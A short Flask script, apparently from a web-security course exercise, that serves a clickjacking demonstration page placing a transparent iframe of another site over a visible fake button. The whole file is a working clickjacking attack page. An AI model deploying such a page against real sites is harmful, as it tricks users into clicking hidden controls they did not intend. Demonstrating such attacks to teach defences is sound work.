from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def home():
    return render_template_string('''
    <html>
        <head>
            <title>Attacker App</title>
            <style>
                iframe {
                    width: 500px;
                    height: 300px;
                    opacity: 0;
                    position: absolute;
                    top: 0;
                    left: 0;
                }
                .fake-button {
                    width: 100px;
                    height: 30px;
                    background-color: #4CAF50;
                    color: white;
                    font-size: 10px;
                    border: none;
                    cursor: pointer;
                }
            </style>
        </head>
        <body>
            <h1>Clickjacking Demonstration</h1>
            <button class="fake-button">Fake Button</button>
            <iframe src="https://5000-rbozburun-udemyprojects-lva3ga92hof.ws-us115.gitpod.io/"></iframe>
        </body>
    </html>
    ''')

if __name__ == '__main__':
    app.run(debug=True, port=5001)